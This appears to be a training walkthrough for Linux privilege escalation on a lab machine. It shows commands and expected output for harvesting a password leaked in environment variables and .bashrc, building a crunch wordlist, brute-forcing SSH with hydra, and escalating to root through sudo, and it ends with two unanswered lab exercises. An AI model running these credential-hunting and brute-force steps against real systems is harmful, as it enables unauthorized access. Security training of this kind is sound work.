# Inspecting User Trails

Inspecting Environment Variables
>``` shell
>joe@debian-privesc:~$ env
>
># ========== Expected Result ==========
>...
>XDG_SESSION_CLASS=user
>TERM=xterm-256color
>SCRIPT_CREDENTIALS=lab
>USER=joe
>LC_TERMINAL_VERSION=3.4.16
>SHLVL=1
>XDG_SESSION_ID=35
>LC_CTYPE=UTF-8
>XDG_RUNTIME_DIR=/run/user/1000
>SSH_CLIENT=192.168.118.2 59808 22
>PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
>DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
>MAIL=/var/mail/joe
>SSH_TTY=/dev/pts/1
>OLDPWD=/home/joe/.cache
>_=/usr/bin/env
># =====================================
>```

Inspecting .bashrc
>``` shell
>joe@debian-privesc:~$ cat .bashrc
>
># ========== Expected Result ==========
># ~/.bashrc: executed by bash(1) for non-login shells.
># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
># for examples
>
># If not running interactively, don't do anything
>case $- in
>    *i*) ;;
>      *) return;;
>esac
>
># don't put duplicate lines or lines starting with space in the history.
># See bash(1) for more options
>export SCRIPT_CREDENTIALS="lab"
>HISTCONTROL=ignoreboth
>...
># =====================================
>```

Becoming 'root' user with the leaked credential
>``` shell
>joe@debian-privesc:~$ su - root
>
># ========== Expected Result ==========
>Password:
># =====================================
>
>root@debian-privesc:~# whoami
>
># ========== Expected Result ==========
>root
># =====================================
>```

Generating a wordlist for a bruteforce attack
>``` shell
>kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
>```

Inspecting the Wordlist Content
>``` shell
>kali@kali:~$ cat wordlist
>
># ========== Expected Result ==========
>Lab000
>Lab001
>Lab002
>Lab003
>Lab004
>Lab005
>Lab006
>Lab007
>Lab008
>Lab009
>...
># =====================================
>```

Successfully brute-forced eve's password
>``` shell
>kali@kali:~$ hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
>
># ========== Expected Result ==========
>Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
>
>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-23 14:30:44
>[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
>[DATA] attacking ssh://192.168.50.214:22/
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab000" - 1 of 1000 [child 0] (0/0)
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab001" - 2 of 1000 [child 1] (0/0)
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab002" - 3 of 1000 [child 2] (0/0)
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab003" - 4 of 1000 [child 3] (0/0)
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab004" - 5 of 1000 [child 2] (0/0)
>...
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab120" - 121 of 1000 [child 0] (0/0)
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab121" - 122 of 1000 [child 3] (0/0)
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab122" - 123 of 1000 [child 2] (0/0)
>[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab123" - 124 of 1000 [child 1] (0/0)
>[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
>1 of 1 target successfully completed, 1 valid password found
># =====================================
>```

Successfully Logged in as eve
>``` shell
>kali@kali:~$ ssh eve@192.168.50.214
>
># ========== Expected Result ==========
>eve@192.168.50.214's password:
>Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
>...
>eve@debian-privesc:~$
># =====================================
>```

Inspecting sudo capabilities
>``` shell
>eve@debian-privesc:~$ sudo -l
>
># ========== Expected Result ==========
>[sudo] password for eve:
>Matching Defaults entries for eve on debian-privesc:
>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
>
>User eve may run the following commands on debian-privesc:
>    (ALL : ALL) ALL
># =====================================
>```

Elevating to root
>``` shell
>eve@debian-privesc:~$ sudo -i
>
># ========== Expected Result ==========
>[sudo] password for eve:
># =====================================
>
>root@debian-privesc:/home/eve# whoami
>
># ========== Expected Result ==========
>root
># =====================================
>```

Lab 1 - Connect to VM 1 and repeat the steps learned in this section. Which command is used to list sudoer capabilities for a given user?
>``` shell
>
>```
>

Lab 2 - Connect to the VM 2 machine with the provided credentials and try to get the flag that resides under another user's file.
>``` shell
>
>```
>
